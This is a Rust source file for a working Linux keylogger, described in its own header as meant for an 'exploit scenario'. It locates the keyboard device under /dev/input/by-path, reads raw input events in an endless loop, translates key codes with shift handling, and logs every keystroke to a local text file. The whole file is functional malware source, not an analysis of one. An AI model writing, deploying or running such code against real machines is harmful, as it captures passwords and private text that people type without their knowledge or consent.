use std::process::Command;
use std::fs::File;
use std::io::{Read, Write, Cursor};
use byteorder::{LittleEndian, ReadBytesExt};


/* This is a minimal working keylogger for Linux which dumps the logged
 * keyboard events to a file until it is stopped externally. It is written
 * to fail fast: it panics directly whenever something unexpected
 * happens. This is ok for our exploit scenario.
 */

const DEV_PATH: &str = "/dev/input/by-path/";

fn main() {
  //Search in `/dev/input/by_path` for anything with "kbd" in it
  //IMPORTANT!!! If you are running this inside a VM, you either have to open
  //the VM in a window (so not in detached or headless mode) and let the VM
  //capture your keyboard input, or, use some hypervisor-specific method to
  //send keyboard input (for example,
  //`vboxmanage controlvm <vm_name> keyboardputstring <input_string>` for
  //Virtualbox). Otherwise, the discovered keyboard event file will not show
  //your keyboard input
  let output = Command::new("ls")
    .args(["-lah", DEV_PATH]).output().unwrap().stdout;
  let parsed_output = String::from_utf8(output).unwrap();
  let rel_event_file = parsed_output.lines().find(|line| line.contains("kbd"))
    .unwrap().split("-> ").collect::<Vec<_>>()[1];
  let abs_event_file = format!("{}{}", DEV_PATH, rel_event_file);
  println!("Found keyboard at: {}", abs_event_file);

  //Output file to dump logged key events in
  let mut output_file = File::create("./logged_keyboard_events.txt").unwrap();

  //Open the event file for reading
  let mut kbd_file = File::open(abs_event_file).unwrap();

  // === Log keyboard events ===
  /* In Linux, each event is represented by:
       struct input_event {
         struct timeval time; //2*8byte
         unsigned short type; //2byte
         unsigned short code; //2byte
         unsigned int value;  //4byte
       };
     One `input_event` is thus 24 bytes long
     And `struct timeval` is represented by:
       struct timeval {
         time_t       tv_sec;   /* Seconds */
         suseconds_t  tv_usec;  /* Microseconds */
       };
     See https://www.kernel.org/doc/Documentation/input/input.txt for more info
     You can either recreate these structs in Rust using a `repr(C)`
     implementation and use `std::mem::transmute` to transmute the raw event
     bytes into an instance of `input_event`
     Or, you can parse the fields separately from the raw bytes, as we do in
     this implementation below
  */

  //Raw bytes that represent a `input_event` struct
  let mut packet = [0u8; 24];

  //Keep reading the keyboard events until this program is stopped
  let mut shift = false;
  loop {
    kbd_file.read_exact(&mut packet).unwrap();
    //We use `Cursor` because the `byteorder` crate implements useful integer
    //parsing methods for it (e.g., read_u64)
    let mut rdr = Cursor::new(packet);
    //Read the fields separately
    let _tv_sec = rdr.read_u64::<LittleEndian>().unwrap();
    let _tv_usec = rdr.read_u64::<LittleEndian>().unwrap();
    let _type = rdr.read_u16::<LittleEndian>().unwrap();
    let code = rdr.read_u16::<LittleEndian>().unwrap();
    let value = rdr.read_u32::<LittleEndian>().unwrap();

    //Map the event code to a keyboard key
    let arr = if shift { SHIFT_KEY_NAMES } else { KEY_NAMES };
    if code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT {
      if value == KEY_PRESS { shift = true }
      else { shift = false }
      continue;
    }

    //Print the key values
    if value == KEY_PRESS && code < MAX_KEYS {
      let i = arr[code as usize];
      //Store in output file
      write!(output_file, "{}", i).unwrap();
      output_file.flush().unwrap();
    }
  }
}

//tokens taken from https://github.com/gsingh93/keylogger/tree/master
const MAX_KEYS: u16 = 112;
//const EV_KEY: u16 = 1;
//const KEY_RELEASE: u32 = 0;
const KEY_PRESS: u32 = 1;
const KEY_LEFTSHIFT: u16 = 42;
const KEY_RIGHTSHIFT: u16 = 43;
const UK: &'static str = "<UK>";

const KEY_NAMES: [&'static str; MAX_KEYS as usize] = [
  UK, "<ESC>",
  "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
  "<Backspace>", "<Tab>",
  "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
  "[", "]", "<Enter>", "<LCtrl>",
  "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
  "'", "`", "<LShift>",
  "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
  "<RShift>",
  "<KP*>",
  "<LAlt>", " ", "<CapsLock>",
  "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
  "<NumLock>", "<ScrollLock>",
  "<KP7>", "<KP8>", "<KP9>",
  "<KP->",
  "<KP4>", "<KP5>", "<KP6>",
  "<KP+>",
  "<KP1>", "<KP2>", "<KP3>", "<KP0>",
  "<KP.>",
  UK, UK, UK,
  "<F11>", "<F12>",
  UK, UK, UK, UK, UK, UK, UK,
  "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UK,
  "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
  "<PageDown>", "<Insert>", "<Delete>"
];

const SHIFT_KEY_NAMES: [&'static str; MAX_KEYS as usize] = [
  UK, "<ESC>",
  "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
  "<Backspace>", "<Tab>",
  "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
  "{", "}", "<Enter>", "<LCtrl>",
  "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
  "\"", "~", "<LShift>",
  "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
  "<RShift>",
  "<KP*>",
  "<LAlt>", " ", "<CapsLock>",
  "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
  "<NumLock>", "<ScrollLock>",
  "<KP7>", "<KP8>", "<KP9>",
  "<KP->",
  "<KP4>", "<KP5>", "<KP6>",
  "<KP+>",
  "<KP1>", "<KP2>", "<KP3>", "<KP0>",
  "<KP.>",
  UK, UK, UK,
  "<F11>", "<F12>",
  UK, UK, UK, UK, UK, UK, UK,
  "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UK,
  "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
  "<PageDown>", "<Insert>", "<Delete>"
];

